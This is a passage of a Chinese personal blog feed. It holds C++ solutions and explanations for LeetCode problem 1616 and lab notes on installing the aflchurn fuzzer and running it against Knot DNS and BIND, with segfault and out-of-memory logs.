class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>使用前缀和，sum表示字母比数字多多少，如果是0，则说明区间[0,i]上是字母数字平衡的<br>对于不是0的情况，若[0,a]字母比数字多n个，[0,b]字母比数字也多n个，则[a+1,b]中，数字字母一样多<br>由于求最长子串，则存每个n第一次出现的位置即可</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1616-分割两个字符串得到回文串&quot;&gt;&lt;a href=&quot;#1616-分割两个字符串得到回文串&quot; class=&quot;headerlink&quot; title=&quot;1616. 分割两个字符串得到回文串&quot;&gt;&lt;/a&gt;1616. 分割两个字符串得到回文串&lt;/h2&gt;&lt;h3 id=&quot;ac代码&quot;&gt;&lt;a href=&quot;#ac代码&quot; class=&quot;headerlink&quot; title=&quot;ac代码&quot;&gt;&lt;/a&gt;ac代码&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;checkPalindromeFormation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string a, string b)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = a.&lt;span class=&quot;built_in&quot;&gt;length&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(len == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flaga = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;, flagb = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a[i] == b[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = i; j &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(b[j] != b[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flagb = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = i; j &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a[j] != a[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flaga = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flaga || flagb) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        flaga = flagb = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i] == b[i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = i; j &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a[j] != a[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flaga = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = i; j &amp;lt; len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(b[j] != b[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                flagb = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; flaga || flagb;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;ab两个字符串在同一个位置分隔开，若 $ pre_a + suf_b $ 或 $ pre_b + suf_a $ 是回文串，则返回true，否则返回false&lt;br&gt;这个规则相当于ab截取相同且任意长的前缀并交换，看交换后是否存在回文&lt;br&gt;我的思路是先比较a的第i位与b的倒数第i位是否想等，找到第一次不相等的位置i，此时可以从第i位分割，判断b的剩余部分是否是回文，或者从len-i-1处分割，判断a的剩余部分是否是回文&lt;br&gt;若都不是，再比较b的第i位与a的倒数i位，找到第一个不满足的i，再比较a，b的剩余部分&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;优化行数&quot;&gt;&lt;a href=&quot;#优化行数&quot; class=&quot;headerlink&quot; title=&quot;优化行数&quot;&gt;&lt;/a&gt;优化行数&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;checkPalindromeFormation&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string a, string b)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = a.&lt;span class=&quot;built_in&quot;&gt;length&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; paliA = len/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;, paliB = len/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(paliA &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; a[paliA] == a[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-paliA]) paliA--;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(paliB &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; b[paliB] == b[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-paliB]) paliB--;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i, j;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(a[i] != b[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; len/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(b[j] != a[len&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;-j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(paliA, paliB) &amp;lt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(i, j);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>aflchurn的使用</title>
    <link href="https://jingtianer.github.io/home/2023/03/15/%E7%BB%84%E4%BC%9A/aflchurn/"/>
    <id>https://jingtianer.github.io/home/2023/03/15/%E7%BB%84%E4%BC%9A/aflchurn/</id>
    <published>2023-03-15T04:15:37.000Z</published>
    <updated>2023-03-20T03:25:02.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="尝试对knot-dns进行测试"><a href="#尝试对knot-dns进行测试" class="headerlink" title="尝试对knot dns进行测试"></a>尝试对knot dns进行测试</h2><blockquote><p>尝试对knot dns进行测试，和之前皓辰的结果一样，程序找不到新路径</p></blockquote><blockquote><p>knot dns在运行时会产生Segment fault，不知道是什么原因，程序<code>_exit</code>值为139。在github中查找了该退出代码，并没有找到相应文件</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ <span class="built_in">export</span> SUBJECT=<span class="variable">$PWD</span>/knot-dns</span><br><span class="line">tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ <span class="variable">$SUBJECT</span>/tests-fuzz/knotd_stdio -c <span class="variable">$SUBJECT</span>/tests-fuzz/knotd_wrap/knot_stdio.conf</span><br><span class="line">2023-03-19T20:17:55-0700 info: Knot DNS 3.3.dev.1678845372.e31fee4 starting</span><br><span class="line">2023-03-19T20:17:55-0700 info: loaded configuration file <span class="string">&#x27;/home/tt/Desktop/dnsenv/aflgo-knot/knot-dns/tests-fuzz/knotd_wrap/knot_stdio.conf&#x27;</span>, mapsize 500 MiB</span><br><span class="line">2023-03-19T20:17:55-0700 warning: no network interface configured</span><br><span class="line">2023-03-19T20:17:55-0700 info: AFL, UDP handler listening on stdin</span><br><span class="line">2023-03-19T20:17:55-0700 warning: removing stale PID file <span class="string">&#x27;/tmp/knotd-fuzz/rundir/knot.pid&#x27;</span></span><br><span class="line">2023-03-19T20:17:55-0700 info: loading 0 zones</span><br><span class="line">2023-03-19T20:17:55-0700 warning: no zones loaded</span><br><span class="line">2023-03-19T20:17:55-0700 info: starting server</span><br><span class="line">2023-03-19T20:17:55-0700 info: server started <span class="keyword">in</span> the foreground, PID 128184</span><br><span class="line">2023-03-19T20:17:55-0700 info: control, binding to <span class="string">&#x27;/tmp/knotd-fuzz/rundir/knot.sock&#x27;</span></span><br><span class="line">2023-03-19T20:17:55-0700 info: AFL, empty TCP handler</span><br><span class="line">Segmentation fault</span><br><span class="line">tt@ubuntu:~/Desktop/dnsenv/aflgo-knot$ <span class="built_in">echo</span> $?</span><br><span class="line">139</span><br></pre></td></tr></table></figure><h2 id="aflchurn简介"><a href="#aflchurn简介" class="headerlink" title="aflchurn简介"></a>aflchurn简介</h2><ul><li><a href="https://github.com/aflchurn/aflchurn">aflchurn主页</a></li></ul><p>作者通过观察<code>oss-fuzz</code>中的bugs发现，新出现的bug往往与最新添加、修改的代码有关，在fuzz时给予最新修改过的bb块更高的权重，其他bb块更低的权重</p><h3 id="aflchurn-x2F-tʃɜːn-x2F-安装"><a href="#aflchurn-x2F-tʃɜːn-x2F-安装" class="headerlink" title="aflchurn(&#x2F;tʃɜːn&#x2F;)安装"></a>aflchurn(&#x2F;tʃɜːn&#x2F;)安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aflchurn/aflchurn.git</span><br><span class="line">cd aflchurn</span><br><span class="line">export AFLCHURN=$PWD</span><br><span class="line">make clean all</span><br><span class="line">cd llvm_mode</span><br><span class="line">make clean all</span><br></pre></td></tr></table></figure><blockquote><p>比较简单，直接下载编译即可</p></blockquote><h3 id="利用aflchurn插装"><a href="#利用aflchurn插装" class="headerlink" title="利用aflchurn插装"></a>利用aflchurn插装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=$AFLCHURN/afl-clang-fast CXX=$AFLCHURN/afl-clang-fast++ ./configure [...options...]</span><br><span class="line">make</span><br></pre></td></tr></table></figure><blockquote><p>与afl相同</p></blockquote><h3 id="测试bind"><a href="#测试bind" class="headerlink" title="测试bind"></a>测试bind</h3><blockquote><p>问题1：插装时，发现大量文件产生错误<code>fatal: unknown date format unix</code>，不能正确读取文件的修改时间信息</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">                  aflchurn 2.57b (dns_message_parse)</span><br><span class="line"></span><br><span class="line">┌─ process timing ─────────────────────────────────────┬─ overall results ─────┐</span><br><span class="line">│        run time : 0 days, 0 hrs, 12 min, 25 sec      │  cycles <span class="keyword">done</span> : 0      │</span><br><span class="line">│   last new path : 0 days, 0 hrs, 0 min, 1 sec        │  total paths : 1203   │</span><br><span class="line">│ last <span class="built_in">uniq</span> crash : none seen yet                      │ <span class="built_in">uniq</span> crashes : 0      │</span><br><span class="line">│  last <span class="built_in">uniq</span> hang : none seen yet                      │   <span class="built_in">uniq</span> hangs : 0      │</span><br><span class="line">├─ cycle progress ────────────────────┬─ map coverage ─┴───────────────────────┤</span><br><span class="line">│  now processing : 268 (22.28%)      │    map density : 2.15% / 8.51%         │</span><br><span class="line">│ paths timed out : 0 (0.00%)         │ count coverage : 3.64 bits/tuple       │</span><br><span class="line">├─ stage progress ────────────────────┼─ findings <span class="keyword">in</span> depth ────────────────────┤</span><br><span class="line">│  now trying : arith 8/8             │ favored paths : 353 (29.34%)           │</span><br><span class="line">│ stage execs : 2166/9256 (23.40%)    │  new edges on : 452 (37.57%)           │</span><br><span class="line">│ total execs : 1.70M                 │ total crashes : 0 (0 unique)           │</span><br><span class="line">│  <span class="built_in">exec</span> speed : 1930/sec              │aflchurn <span class="built_in">factor</span>: 2.136                  │</span><br><span class="line">├─ fuzzing strategy yields ───────────┴───────────────┬─ path geometry ────────┤</span><br><span class="line">│   bit flips : 265/66.5k, 59/66.4k, 32/66.3k         │    levels : 2          │</span><br><span class="line">│  byte flips : 3/8312, 7/6476, 5/6420                │   pending : 1147       │</span><br><span class="line">│ arithmetics : 233/356k, 8/196k, 1/84.5k             │  pend fav : 343        │</span><br><span class="line">│  known ints : 12/26.2k, 26/136k, 32/251k            │ own finds : 903        │</span><br><span class="line">│  dictionary : 0/0, 0/0, 14/96.4k                    │  imported : n/a        │</span><br><span class="line">│       havoc : 206/312k, 0/0                         │ stability : 75.52%     │</span><br><span class="line">│        trim : 0.00%/3397, 21.26%                    ├────────────────────────┘</span><br><span class="line">└─────────────────────────────────────────────────────┘          [cpu002:127%]</span><br></pre></td></tr></table></figure><blockquote><p>aflchurm和aflgo一直都在跑，最后跑出了一个oom</p></blockquote><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] PROGRAM ABORT : Unable to request new process from fork server (OOM?)</span><br><span class="line">         Location : run_target(), afl-fuzz.c:2882</span><br></pre></td></tr></table></figure><blockquote><p>应该是运行时设置了参数<code>-m 12800</code>，每次测试程序之允许分配12800MB的内存，导致程序内存不足</p></blockquote><h3 id="增大内存分配"><a href="#增大内存分配" class="headerlink" 